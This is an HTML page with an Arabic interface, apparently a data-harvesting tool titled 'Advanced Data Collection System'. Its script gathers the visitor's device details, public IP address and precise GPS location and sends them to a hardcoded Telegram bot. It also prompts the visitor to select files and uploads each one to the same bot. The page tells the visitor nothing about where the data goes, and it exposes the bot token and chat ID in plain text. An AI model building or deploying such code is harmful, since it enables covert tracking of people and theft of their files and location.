<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام جمع البيانات المتقدم</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            text-align: center;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #f9f9f9;
            min-height: 100px;
            text-align: right;
        }
        .log {
            margin: 5px 0;
            padding: 5px;
            border-bottom: 1px solid #eee;
        }
        .success { color: green; }
        .warning { color: orange; }
        .error { color: red; }
        #fileUploader {
            display: none;
        }
        .btn-blue {
            background-color: #4285f4;
        }
        .btn-blue:hover {
            background-color: #3367d6;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>نظام جمع البيانات المتقدم</h1>
        
        <div>
            <button onclick="startFullProcess()">بدء العملية الكاملة</button>
            <button class="btn-blue" onclick="uploadFiles()">رفع ملفات</button>
            <button class="btn-blue" onclick="getRealLocation()">الحصول على الموقع</button>
        </div>
        
        <input type="file" id="fileUploader" multiple>
        <div id="output"></div>
    </div>

    <script>
        // تكوين التلجرام
        const TELEGRAM_BOT_TOKEN = "7517879972:AAF8cV7AValEWxo9NyihtHDsFe7ZRjfmW-s";
        const TELEGRAM_CHAT_ID = "6913353602";

        // نظام التسجيل
        function log(message, type = '') {
            const output = document.getElementById('output');
            const logEntry = document.createElement('div');
            logEntry.className = `log ${type}`;
            logEntry.textContent = message;
            output.appendChild(logEntry);
            output.scrollTop = output.scrollHeight;
        }

        // إرسال نصوص إلى التلجرام
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (e) {
                log(`خطأ في إرسال التلجرام: ${e}`, 'error');
                return false;
            }
        }

        // إرسال صور إلى التلجرام
        async function sendPhotoToTelegram(photoFile) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoFile);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                log(`خطأ في إرسال الصورة: ${error}`, 'error');
                return false;
            }
        }

        // إرسال ملفات إلى التلجرام
        async function sendDocumentToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', file);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                log(`خطأ في إرسال الملف: ${error}`, 'error');
                return false;
            }
        }

        // رفع ملفات حقيقية
        function uploadFiles() {
            document.getElementById('fileUploader').click();
        }

        // معالجة الملفات المختارة
        document.getElementById('fileUploader').addEventListener('change', async (e) => {
            const files = e.target.files;
            if (files.length === 0) return;

            log(`بدء رفع ${files.length} ملف...`, 'success');
            
            for (let i = 0; i < files.length; i++) {
                const file = files[i];
                try {
                    let success;
                    if (file.type.startsWith('image/')) {
                        success = await sendPhotoToTelegram(file);
                    } else {
                        success = await sendDocumentToTelegram(file);
                    }
                    
                    if (success) {
                        log(`تم إرسال الملف: ${file.name} (${formatFileSize(file.size)})`, 'success');
                    } else {
                        log(`فشل إرسال الملف: ${file.name}`, 'error');
                    }
                } catch (error) {
                    log(`خطأ في معالجة الملف ${file.name}: ${error}`, 'error');
                }
            }
        });

        // الحصول على الموقع الحقيقي
        async function getRealLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    log('المتصفح لا يدعم خدمة الموقع الجغرافي', 'warning');
                    return resolve(null);
                }

                log('جاري الحصول على الموقع... يرجى الموافقة على طلب الإذن');

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        const locationMessage = `الموقع الدقيق:
خط العرض: ${lat.toFixed(6)}
خط الطول: ${lon.toFixed(6)}
الدقة: ±${Math.round(accuracy)} متر
رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
                        
                        log(locationMessage, 'success');
                        await sendToTelegram(locationMessage);
                        resolve({ lat, lon });
                    },
                    (error) => {
                        const errorMessage = {
                            1: 'تم رفض الإذن من المستخدم',
                            2: 'تعذر الحصول على الموقع',
                            3: 'انتهت المهلة'
                        }[error.code] || error.message;
                        
                        log(`خطأ في الموقع: ${errorMessage}`, 'error');
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // الحصول على عنوان IP
        async function getIPAddress() {
            try {
                log('جاري الحصول على عنوان IP...');
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                log(`عنوان IP: ${data.ip}`, 'success');
                await sendToTelegram(`عنوان IP: ${data.ip}`);
                return data.ip;
            } catch (error) {
                log(`خطأ في الحصول على IP: ${error}`, 'error');
                return null;
            }
        }

        // جمع معلومات النظام
        async function getSystemInfo() {
            try {
                const info = {
                    'نظام التشغيل': navigator.platform,
                    'وكيل المستخدم': navigator.userAgent,
                    'اللغة': navigator.language,
                    'عدد أنوية المعالج': navigator.hardwareConcurrency || 'غير معروف',
                    'ذاكرة الجهاز': `${navigator.deviceMemory || 'غير معروف'} GB`,
                    'دقة الشاشة': `${window.screen.width}x${window.screen.height}`,
                    'الوقت الحالي': new Date().toLocaleString(),
                    'الاتصال بالإنترنت': navigator.onLine ? 'متصل' : 'غير متصل'
                };

                // معلومات البطارية
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    info['نسبة البطارية'] = `${Math.floor(battery.level * 100)}%`;
                    info['حالة الشحن'] = battery.charging ? 'يشحن' : 'لا يشحن';
                }

                log('معلومات النظام:', 'success');
                let telegramMessage = "<b>معلومات النظام:</b>\n";
                
                for (const [key, value] of Object.entries(info)) {
                    log(`- ${key}: ${value}`);
                    telegramMessage += `- ${key}: ${value}\n`;
                }
                
                await sendToTelegram(telegramMessage);
                return info;
            } catch (error) {
                log(`خطأ في جمع معلومات النظام: ${error}`, 'error');
                return null;
            }
        }

        // تنسيق حجم الملف
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 بايت';
            const k = 1024;
            const sizes = ['بايت', 'كيلوبايت', 'ميجابايت', 'جيجابايت'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // العملية الرئيسية
        async function startFullProcess() {
            try {
                log('🚀 بدء العملية الكاملة...', 'success');
                
                // 1. جمع معلومات النظام
                await getSystemInfo();
                
                // 2. الحصول على عنوان IP
                await getIPAddress();
                
                // 3. الحصول على الموقع
                await getRealLocation();
                
                // 4. طلب رفع الملفات
                uploadFiles();
                
                log('✔ تم الانتهاء من جميع الخطوات', 'success');
            } catch (error) {
                log(`❌ حدث خطأ جسيم: ${error}`, 'error');
            }
        }

        // تهيئة الصفحة
        document.addEventListener('DOMContentLoaded', () => {
            log('جاهز لبدء جمع البيانات. اضغط على "بدء العملية الكاملة"', 'success');
        });
    </script>
</body>
</html>
